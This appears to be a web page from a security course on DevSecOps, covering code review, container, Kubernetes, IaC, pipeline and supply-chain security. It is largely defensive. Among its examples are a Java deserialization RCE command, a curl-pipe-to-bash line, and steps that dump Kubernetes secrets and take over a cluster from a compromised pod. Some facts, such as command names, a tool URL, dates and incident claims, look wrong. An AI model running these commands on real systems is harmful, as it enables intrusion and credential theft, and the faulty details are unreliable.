@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Part 5 — DevSecOps &amp; CI/CD Security</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Part 5 — DevSecOps &amp; CI/CD</strong>
+</nav>
+
+<header class="part-header">
+<h1>⚙️ PART 5 — DEVSECOPS &amp; CI/CD SECURITY</h1>
+<p class="subtitle">Source code review, SAST/DAST/SCA, container security, IaC security, pipeline security.</p>
+<div class="chapters">
+<a href="#ch27"><span class="ch-num">27</span> Secure Code Review</a>
+<a href="#ch28"><span class="ch-num">28</span> SAST / DAST / SCA</a>
+<a href="#ch29"><span class="ch-num">29</span> Container Security (Docker)</a>
+<a href="#ch30"><span class="ch-num">30</span> Kubernetes Security</a>
+<a href="#ch31"><span class="ch-num">31</span> IaC Security (Terraform/CloudFormation/Ansible)</a>
+<a href="#ch32"><span class="ch-num">32</span> CI/CD Pipeline Security</a>
+<a href="#ch33"><span class="ch-num">33</span> Supply Chain Attacks</a>
+</div>
+</header>
+
+<main>
+
+<!-- =================== CH 27 =================== -->
+<h1 id="ch27">📝 Chapter 27 — Secure Code Review (White-Box VAPT)</h1>
+
+<h2>27.1 Why Code Review Matters</h2>
+<p>Automated tools miss 60–80% of vulnerabilities. Code review by humans remains the
+gold standard. As a manager, you should be able to <strong>review or evaluate</strong>
+manual code reviews.</p>
+
+<h2>27.2 Languages &amp; Their Risk Profiles</h2>
+<table>
+<tr><th>Language</th><th>Top Risks</th><th>Tools</th></tr>
+<tr><td>Java</td><td>Deserialization, JNDI injection, SSRF</td><td>Semgrep, CodeQL</td></tr>
+<tr><td>JavaScript / Node</td><td>Prototype pollution, SSRF, XSS</td><td>ESLint security, snyk</td></tr>
+<tr><td>Python</td><td>Eval, pickle, SQL format</td><td>Bandit, Semgrep</td></tr>
+<tr><td>PHP</td><td>Type juggling, file inclusion, unserialize</td><td>PHP_CodeSniffer, snyk</td></tr>
+<tr><td>C / C++</td><td>Buffer overflows, UAF, integer overflows</td><td>Coverity, clang-static-analyzer</td></tr>
+<tr><td>Go</td><td>Go race, log injection, weak crypto</td><td>Gosec</td></tr>
+<tr><td>Rust</td><td>unsafe block misuse, integer overflow</td><td>cargo-audit, rustsec</td></tr>
+</table>
+
+<h2>27.3 Methodology — How to Review 100k+ Lines of Code</h2>
+<div class="methodology">
+<h4>5-Phase Manual Review Process</h4>
+<ol>
+<li><strong>Triage</strong> — Find entry points, file structure, frameworks, exposed APIs (30 min for a 100k LoC)</li>
+<li><strong>Data flow</strong> — Trace input → sink paths (auth → DB, file → shell, request → render)</li>
+<li><strong>Sink analysis</strong> — Find dangerous functions (eval, exec, deserialize)</li>
+<li><strong>Trust boundaries</strong> — Find where user input crosses trust boundaries (controllers, API handlers)</li>
+<li><strong>Business logic</strong> — Workflows, ID generation, transaction logic</li>
+</ol>
+</div>
+
+<h2>27.4 Common Sink Functions to Search</h2>
+<pre><code class="cmd"># ── Java ──
+grep -rE 'Runtime\.exec|ProcessBuilder|ObjectInputStream|XMLDecoder|Class\.forName|JNDI|URLConnection|HTTPRequest|SQL' src/
+
+# ── Node.js ──
+grep -rE 'eval|child_process|require\(|deserialize\(|fs\.read|punycode' src/
+
+# ── Python ──
+grep -rE 'eval\(|exec\(|os\.system|subprocess|pickle\.loads|input\(|cursor\.execute' src/
+
+# ── PHP ──
+grep -rE 'eval\(|exec\(|system|passthru|unserialize\(|file_get_contents|include\(' src/
+</code></pre>
+
+<h2>27.5 Real-World Example: Java Deserialization Sink</h2>
+<pre><code class="cmd">// Vulnerable Java code (UserController.java)
+@RequestMapping("/api/users")
+public class UserController {
+  @PostMapping("/upload")
+  public ResponseEntity upload(@RequestParam("data") String data) throws Exception {
+    byte[] bytes = Base64.getDecoder().decode(data);
+    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+    User user = (User) ois.readObject();     // ← VULNERABLE!
+    return ResponseEntity.ok(userService.save(user));
+  }
+}
+
+// Exploit (ysoerial tool)
+$ java -jar ysoserial-all.jar CommonsBeanutils1 "touch /tmp/pwned" | base64
+# Send as:
+curl -X POST target/api/users/upload -F "data=&lt;base64&gt;"
+# Remote Code Execution as the web server user ✨
+</code></pre>
+
+<h2>27.6 Common SAST Tools</h2>
+<table>
+<tr><th>Tool</th><th>Languages</th><th>License</th><th>Best For</th></tr>
+<tr><td>Semgrep</td><td>20+</td><td>OSS / Pro</td><td>Developer-friendly, fast</td></tr>
+<tr><td>CodeQL</td><td>10+</td><td>OSS</td><td>GitHub-native, deep analysis</td></tr>
+<tr><td>Snyk Code</td><td>10</td><td>Commercial</td><td>Best in IDE</td></tr>
+<tr><td>SonarQube</td><td>27</td><td>OSS + Enterprise</td><td>Enterprise dashboards</td></tr>
+<tr><td>Checkmarx</td><td>25</td><td>Commercial</td><td>Enterprise, prominent in big corps</td></tr>
+<tr><td>Veracode</td><td>Many</td><td>Commercial SaaS</td><td>Cloud-based ASOC</td></tr>
+<tr><td>Bandit</td><td>Python</td><td>OSS</td><td>Python only</td></tr>
+<tr><td>Gosec</td><td>Go</td><td>OSS</td><td>Go only</td></tr>
+</table>
+
+<h2>27.7 Code Review Checklist</h2>
+<ul class="checklist">
+  <li>All inputs validated server-side</li>
+  <li>Parameterized queries — no string concat in SQL</li>
+  <li>No <code>eval()</code>, <code>exec()</code>, <code>deserialize()</code> on untrusted data</li>
+  <li>Authentication checked on every protected endpoint</li>
+  <li>Authorization checks per resource (not per role)</li>
+  <li>Sensitive data encrypted at rest</li>
+  <li>HTTPS-only — no HTTP allowed</li>
+  <li>Secrets NOT hardcoded — use vault/KMS</li>
+  <li>Logging doesn't include sensitive data (passwords, tokens, PII)</li>
+  <li>Error handling doesn't leak stack traces to user</li>
+</ul>
+
+
+<!-- =================== CH 28 =================== -->
+<h1 id="ch28">🤖 Chapter 28 — SAST, DAST &amp; SCA</h1>
+
+<h2>28.1 The Three Main AppSec Testing Types</h2>
+<table>
+<tr><th>Type</th><th>Tests</th><th>Needs App?</th><th>Pros</th><th>Cons</th></tr>
+<tr><td><strong>SAST</strong> (Static)</td><td>Source code</td><td>No</td><td>Earlier in SDLC, no running app needed</td><td>False positives, no context</td></tr>
+<tr><td><strong>DAST</strong> (Dynamic)</td><td>Running app</td><td>Yes</td><td>Real attack surface, fewer false positives</td><td>Late in SDLC, blind to source</td></tr>
+<tr><td><strong>SCA</strong> (Software Composition Analysis)</td><td>Third-party libs</td><td>lockfile</td><td>Captures supply-chain issues (Log4Shell!)</td><td>Only library issues</td></tr>
+<tr><td><strong>IAST</strong> (Interactive)</td><td>Instrumented instrumented</td><td>Yes</td><td>Combines SAST + DAST inside the running app</td><td>Deployment complexity</td></tr>
+</table>
+
+<h2>28.2 Comparing Tools</h2>
+<table>
+<tr><th>Tool</th><th>Type</th><th>Use</th></tr>
+<tr><td>Burp Enterprise</td><td>DAST</td><td>Continuous web scanning</td></tr>
+<tr><td>OWASP ZAP</td><td>DAST</td><td>Free scanner</td></tr>
+<tr><td>Nessus / Qualys / InsightVM</td><td>Vulnerability Scanner</td><td>Network + web</td></tr>
+<tr><td>Snyk</td><td>SCA + SAST</td><td>OSS lib &amp; source code</td></tr>
+<tr><td>Trivy</td><td>SCA / Container</td><td>Files + Docker</td></tr>
+<tr><td>Dependabot / Renovate / Mend</td><td>SCA Bots</td><td>Auto PRs for updates</td></tr>
+</table>
+
+
+<!-- =================== CH 29 =================== -->
+<h1 id="ch29">📦 Chapter 29 — Container Security (Docker)</h1>
+
+<h2>29.1 Docker Attack Surface</h2>
+<div class="diagram">
+DOCKER ATTACK SURFACE
+══════════════════════
+
+┌─────────────────────────────────────┐
+│  Host Kernel ─ shared with containers│
+└────────────┬────────────────────────┘
+             ▼
+   ┌─────────────────┐
+   │ Docker daemon   │ ── misconfigured API
+   └────────┬────────┘
+            ▼
+   ┌──────────────────┐
+   │ Image Registry    │ ◄── poisoned images (supply chain)
+   └────────┬─────────┘
+            ▼
+   ┌──────────────────┐
+   │ Image Build Process│ ◄── malicious Dockerfile, secrets in layers
+   └────────┬─────────┘
+            ▼
+   ┌──────────────────┐
+   │ Container Runtime  │ ◄── privileged, root, capabilities, mounts
+   └──────────────────┘
+</div>
+
+<h2>29.2 Dockerfile Review — Security Smells</h2>
+<pre><code class="cmd"># ⚠ BAD Dockerfile
+FROM ubuntu:latest                       # Not pinned → untrusted base
+RUN apt update &amp;&amp; apt install -y curl    # No version pin
+COPY . /app                              # Includes .git/.env with secrets
+RUN curl -sSL https://x.com/install.sh | bash   # Piped curl = backdoor magnet
+USER root                                # Running as root
+ENV API_KEY=AKIAEXAMPLE                 # Hardcoded secret
+EXPOSE 22                                # Exposing SSH inside container
+CMD ./start.sh                           # No exec form → no signal handling
+</code></pre>
+
+<pre><code class="cmd"># ✅ GOOD Dockerfile
+FROM ubuntu:22.04@sha256:abc...          # Pinned &amp; digest-pinned
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
+    curl=7.81.0-1ubuntu1.16              # Version pinned
+COPY --chown=nonroot:nonroot app /app    # Restricted ownership
+USER nonroot:nonroot                     # Non-root user
+HEALTHCHECK CMD curl --fail http://localhost/ || exit 1
+WORKDIR /app
+ENTRYPOINT ["node", "server.js"]         # Exec form
+# Secrets via ENV passed at runtime only
+</code></pre>
+
+<h2>29.3 Container Scanning Tools</h2>
+<pre><code class="cmd"># Trivy — fast all-in-one scanner
+$ trivy image nginx:latest
+$ trivy image --severity CRITICAL,HIGH myapp:1.0
+$ trivy fs .                   # filesystem scan
+$ trivy config Dockerfile      # Dockerfile scan
+$ trivy k8s --report all cluster.json   # K8s manifest scan
+
+# Grype
+$ grype myapp:1.0
+
+# Clair — enterprise (CoreOS Quay)
+# Snyk Container
+$ snyk container test myapp:1.0
+</code></pre>
+
+<h2>29.4 Docker Daemon Misconfigurations</h2>
+<pre><code class="cmd"># Check if Docker API is exposed
+$ curl --unix-socket /var/run/docker.sock http://x/version
+# If accessible without auth → CRITICAL
+
+# TCP-exposed without TLS
+$ curl http://target:2375/containers/json  # if reachable
+# → full container control!
+
+# Always scan for these in your pentest:
+$ nmap -p 2375,2376 --script=http-title target
+</code></pre>
+
+<h2>29.5 Live Container Pentest</h2>
+<pre><code class="cmd"># Identify container you're in
+$ cat /proc/1/cgroup
+# → contains "docker" or "kubepods"
+$ ls -la /.dockerenv             # exists if Docker
+
+# What mounts?
+$ mount | grep -i "vol\|bind"
+# → /host filesystem might be mounted!
+
+# What capabilities?
+$ cat /proc/self/status | grep Cap
+# → Mask down to specific caps
+
+# Can I reach the daemon socket?
+$ ls -la /var/run/docker.sock
+</code></pre>
+
+<h2>29.6 Real-Life Scenario: Docker.sock Leak = Cloud Takeover</h2>
+<div class="scenario">
+<h3>📍 Scenario: AWS CodeBuild Pipeline Exposure</h3>
+<p>A developer mounted <code>/var/run/docker.sock</code> into a container so the
+container could build images. An attacker exploited a command injection inside the
+container. Because the container had full daemon access, the attacker:</p>
+<ol>
+  <li>Created a privileged container with the host root filesystem mounted</li>
+  <li>Read the IAM role credentials from <code>/proc/1/environ</code></li>
+  <li>Used the role to delete every S3 bucket &amp; RDS in production</li>
+</ol>
+<p><strong>Cost: $400K outage</strong> + brand damage. <strong>Fix</strong>: never mount
+docker.sock; use BuildKit or ephemeral build environments.</p>
+</div>
+
+
+<!-- =================== CH 30 =================== -->
+<h1 id="ch30">☸️ Chapter 30 — Kubernetes Security</h1>
+
+<h2>30.1 K8s Attack Surface</h2>
+<div class="diagram">
+KUBERNETES ATTACK SURFACE
+════════════════════════
+
+┌────────────────────────────────────────────────────┐
+│  External (rare)                                   │
+│   • Exposed API server (8080/6443)                 │
+│   • Vulnerable ingress                             │
+└────────────────┬──────────────────────────────────┘
+                 ▼
+┌───────────────────────────────────────────────────┐
+│ AuthN Layer (RBAC + Roles + Service Accounts)     │
+└────────────────┬──────────────────────────────────┘
+                 ▼
+┌───────────────────────────────────────────────────┐
+│ Workloads (Pods/Deployments/DaemonSets)            │
+│ • Privileged containers ☠️                        │
+│ • HostNetwork / HostPID ☠️                        │
+│ • Secrets in env ☠️                               │
+│ • Vulnerable images (Trivy/Grype)                 │
+└────────────────┬──────────────────────────────────┘
+                 ▼
+┌───────────────────────────────────────────────────┐
+│ Data Plane (etcd, kubelet, CNI)                   │
+└───────────────────────────────────────────────────┘
+</div>
+
+<h2>30.2 K8s Pentest Checklist</h2>
+<ul class="checklist">
+<li>Anonymous auth on kube-apiserver?</li>
+<li>Privileged containers running?</li>
+<li>Service account token automounting enabled?</li>
+<li>Docker socket mounted in pod?</li>
+<li>Secrets in env vars (visible in pod spec, logs)?</li>
+<li>RBAC over-permissioned (cluster-admin on default SA)?</li>
+<li>Network policies absent (all pods reachable)?</li>
+<li>etcd open to internet?</li>
+<li>Image registries with no auth?</li>
+<li>Cluster admin accessed via ServiceAccount token?</li>
+</ul>
+
+<h2>30.3 K8s Pentest Tools</h2>
+<pre><code class="cmd"># ── kube-bench ── CIS benchmark scan
+$ kubectl apply -f https://raw.githubusercontent.com/aquatone/kube-bench/main/job.yaml
+$ kubectl logs job/kube-bench
+# Report like CIS-CAT for K8s
+
+# ── kube-hunter ── remote vulnerability scanner
+$ kube-hunter --remote target.k8s.example.com
+# Detects: exposed API, dashboard, etcd, Helm Tiller, kubelet
+
+# ── Peirates ── post-exploitation tool
+$ ./peirates
+# After you have pod exec, pivot across cluster
+
+# ── kubectl-trick CNI ── check your privileges
+$ kubectl auth-can-i --list -n kube-system
+$ kubectl get clusterroles
+$ kubectl get rolebindings -A | grep -v 'system:'
+
+# ── rbac-tool ── visualizes RBAC
+$ rbac-tool show
+
+# ── kubeaudit ── static manifest scanner
+$ docker run --rm -v $(pwd):/dir -t kubeaudit/kubeaudit manifest /dir
+</code></pre>
+
+<h2>30.4 Compromised Pod → Cluster Takeover</h2>
+<pre><code class="cmd"># Got a pod exec — what's the default SA's power?
+$ kubectl auth-can-i --list
+yes
+  secrets:* *
+yes
+  pods:* *
+yes
+  pods/exec:* *
+yes
+  pods/eviction:* *
+
+# Default service account has way too much? Common!
+
+# 1) Get all secrets
+$ kubectl get secrets -A -o yaml &gt; all_secrets.yaml
+$ grep -E 'data:|"token":' all_secrets.yaml
+
+# 2) Get kubeconfig / RBAC privileged SA token
+$ TOKEN=$(kubectl get secrets -n kube-system default-token -o jsonpath='{.data.token}' | base64 -d)
+$ kubectl --token=$TOKEN -s https://10.0.0.1 get nodes
+
+# 3) Compromised cluster-admin SA → kubelet exec on any node
+$ kubectl get nodes
+$ kubectl debug node/worker-1 -it --image=ubuntu
+
+# Now you have root access to a node → host paths, kubelet creds, etc.
+</code></pre>
+
+<h2>30.5 Real-Life Incident: Tesla K8s Misconfig</h2>
+<div class="scenario">
+<h3>📍 Scenario — Tesla K8s Exposed (RedLock, 2018)</h3>
+<p>Tesla's K8s admin console had no password + admin console exposed. A cryptomining
+group exploited the dashboard pod to:
+<ol>
+  <li>Steal AWS creds from pod env vars</li>
+  <li>Get into internal admin tools (Kibana, internal database)</li>
+  <li>Run a Stratum cryptominer using Tesla's compute</li>
+</ol></p>
+<p>Tesla later found the issue after receiving alerts from CloudTrail. Today Tesla
+is one of the most secure cloud-native companies and has open-sourced their
+hardened K8s configs.</p>
+</div>
+
+
+<!-- =================== CH 31 =================== -->
+<h1 id="ch31">📜 Chapter 31 — IaC (Infrastructure as Code) Security</h1>
+
+<h2>31.1 What is IaC and Why It Breaks</h2>
+<p>IaC = Terraform, CloudFormation, Ansible, Pulumi, ARM templates. These files
+<em>define</em> infrastructure. <strong>If insecure IaC is deployed, your cloud
+is insecure by default.</strong></p>
+
+<h2>31.2 Terraform — Security Smells</h2>
+<pre><code class="cmd"># ⚠ BAD Terraform — TG-101-Q
+
+# Public S3 bucket
+resource "aws_s3_bucket" "data" {
+  bucket = "company-data"
+  acl    = "public-read"     # ← Everyone can read!
+}
+
+# Security group open to world
+resource "aws_security_group" "allow_ssh" {
+  ingress {
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]    # ← SSH from anywhere!
+  }
+}
+
+# RDS publicly accessible
+resource "aws_db_instance" "db" {
+  publicly_accessible = true        # ← DB exposed to internet
+  storage_encrypted   = false
+}
+
+# IAM policy over-permissive
+resource "aws_iam_role_policy" "admin" {
+  policy = jsonencode({
+    Statement = [{
+      Effect   = "Allow"
+      Action   = "*"           # ← All actions
+      Resource = "*"
+    }]
+  })
+}
+</code></pre>
+
+<h2>31.3 Recommended Terraform Patterns</h2>
+<pre><code class="cmd"># ✅ GOOD Terraform
+
+# Encrypted + private S3
+resource "aws_s3_bucket" "data" {
+  bucket = "company-data"
+  # ACL no longer default
+}
+resource "aws_s3_bucket_public_access_block" "pab" {
+  bucket = aws_s3_bucket.data.id
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
+  rule {
+    apply_server_side_encryption_by_default {
+      sse_algorithm = "AES256"
+    }
+  }
+}
+
+# SG scoped
+resource "aws_security_group" "allow_ssh" {
+  ingress {
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = ["10.0.0.0/16"]  # only internal
+  }
+}
+</code></pre>
+
+<h2>31.4 IaC Scanning Tools</h2>
+<pre><code class="cmd"># tfsec — Terraform static analysis
+$ tfsec ./
+$ tfsec --soft-fail
+
+# Checkov — multi-IaC
+$ checkov -d ./
+$ checkov -f main.tf --output json
+
+# kics — IaC &amp; more
+$ kics scan -p ./
+
+# terrascan
+$ terrascan scan -i terraform
+
+# Snyk IaC
+$ snyk iac test
+</code></pre>
+
+
+<!-- =================== CH 32 =================== -->
+<h1 id="ch32">🔄 Chapter 32 — CI/CD Pipeline Security</h1>
+
+<h2>32.1 Why Pipelines Are Crown Jewels</h2>
+<div class="diagram">
+TYPICAL CI/CD PIPELINE — Where Attackers Inject
+═══════════════════════════════════════════════
+
+  Developer Commit
+       │
+       ▼
+┌──────────────┐
+│ Source Repo  │ ◄── poisoned commit, dependency confusion
+└──────┬───────┘
+       ▼
+┌──────────────┐
+│ CI Build     │ ◄── exposed creds in env, malicious step
+└──────┬───────┘
+       ▼
+┌──────────────┐
+│ Test         │ ◄── hardcoded creds in tests, fake tests
+└──────┬───────┘
+       ▼
+┌──────────────┐
+│ Deploy       │ ◄── push to prod w/ privilege
+└──────┬───────┘
+       ▼
+┌──────────────┐
+│ Production   │ ◄── attackers reach via any of above
+└──────────────┘
+</div>
+
+<h2>32.2 Common Pipeline Misconfigurations</h2>
+<table>
+<tr><th>Vulnerability</th><th>Where</th><th>Impact</th></tr>
+<tr><td>Hardcoded AWS keys in Jenkinsfile</td><td>Build script</td><td>Full AWS compromise</td></tr>
+<tr><td>Plaintext secrets in .github/workflows</td><td>Actions YAML</td><td>Public repo = exposed</td></tr>
+<tr><td>Self-hosted runners with mounted docker.sock</td><td>GitLab, GitHub</td><td>Build → host compromise</tr>
+<tr><td>Build script uses untrusted input as eval</td><td>mvn, npm</td><td>RCE on build server</td></tr>
+<tr><td>PR from fork can read secrets via echo</td><td>GitHub Actions</td><td>PRs from strangers exfil secrets</td></tr>
+<tr><td>Pipeline stores passwords in artifacts</td><td>Jenkins, GitLab</td><td>Anyone w/ project read can grab</td></tr>
+</table>
+
+<h2>32.3 GitHub Actions Hardening</h2>
+<pre><code class="cmd"># ⚠ DANGEROUS — passing untrusted PR data to shell
+- run: |
+    PR_TITLE=${{ github.event.pull_request.title }}
+    echo "PR Title: $PR_TITLE"          # inject → ${{ }}
+
+# ✅ SAFE — using env var
+- env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: |
+    echo "PR Title: $PR_TITLE"
+
+# ⚠ DANGEROUS — third-party action uses @main (mutable)
+- uses: thirdparty/action@main   # tag ref can change
+
+# ✅ SAFE — pinned to SHA
+- uses: thirdparty/action@a1b2c3d4e5f6...
+</code></pre>
+
+<h2>32.4 Secrets Management in Pipelines</h2>
+<ul>
+  <li><strong>HashiCorp Vault</strong> + dynamic secrets</li>
+  <li><strong>AWS Secrets Manager / Parameter Store</strong></li>
+  <li><strong>Azure Key Vault</strong></li>
+  <li><strong>GitHub Encrypted Secrets</strong> + OIDC to cloud (no static keys!)</li>
+  <li><strong>GitLab CI Variables (masked, protected)</strong></li>
+</ul>
+
+
+<!-- =================== CH 33 =================== -->
+<h1 id="ch33">🎯 Chapter 33 — Supply Chain Attacks</h1>
+
+<h2>33.1 Famous Supply Chain Breaches</h2>
+<table>
+<tr><th>Year</th><th>Attack</th><th>Lesson</th></tr>
+<tr><td>2017</td><td>NotPetya (Ukrainian accounting software M.E.Doc)</td><td>Software update trojan</td></tr>
+<tr><td>2020</td><td>SolarWinds (SUNBURST)</td><td>Build server compromised → 18,000 customers infected</td></tr>
+<tr><td>2021</td><td>Kaseya VSA</td><td>Ransomware via MSP</td></tr>
+<tr><td>2021</td><td>Log4Shell (log4j)</td><td>Embedded in countless products</td></tr>
+<tr><td>2022</td><td>3CX desktop app trojaned</td><td>Build pipeline compromise cascading downstream</td></tr>
+<tr><td>2024</td><td>XZ Utils backdoor</td><td>Maintainer subverted → sshd backdoor</td></tr>
+<tr><td>2024</td><td>PyPI/Node packages with crypto stealers</td><td>Dependency confusion / typosquatting</td></tr>
+</table>
+
+<h2>33.2 Defenses</h2>
+<ul>
+  <li><strong>SBOM</strong> — Software Bill of Materials (CycloneDX, SPDX)</li>
+  <li><strong>Sigstore / Cosign</strong> — Cryptographic signing of artifacts</li>
+  <li><strong>SLSA framework</strong> — Levels of supply-chain assurance</li>
+  <li><strong>Reproducible builds</strong> — Detect tampering</li>
+  <li><strong>Pin dependencies</strong> + use lockfile-scanner (Dependabot)</li>
+  <li><strong>Private package registry mirror</strong> — Can't be poisoned</li>
+</ul>
+
+<pre><code class="cmd"># SBOM generation
+$ syft myapp:1.0 -o cyclonedx-json &gt; sbom.json
+$ trivy sbom sbom.json
+
+# Sign container images
+$ cosign sign --key cosign.key myapp:1.0
+$ cosign verify --key cosign.pub myapp:1.0
+</code></pre>
+
+<h2>33.3 Real-Life Scenario: Dependency Confusion</h2>
+<div class="scenario">
+<h3>📍 Scenario — "TechCorp" Internal Package Hacked</h3>
+<p>TechCorp had an internal <code>@techcorp/auth-utils</code> package. Pentester
+Alex Birsan published a public npm package with the same name &amp; higher version
+number. Pip/NPM installed the public one instead — which contained a token-stealing
+script. With one click from a developer doing "just an npm install," an attacker
+achieved RCE on internal CI runners.</p>
+
+<p><strong>Fix:</strong> Configure package managers to prefer private registry; pin
+versions; use scoped namespaces (@techcorp/* on private registry).</p>
+</div>
+
+</main>
+
+<nav class="next-prev">
+<a href="part4-mobile.html" class="prev">⬅ Part 4</a>
+<a href="part6-cloud.html" class="next">Part 6 — Cloud Security ➡</a>
+</nav>
+
+</body>
+</html>
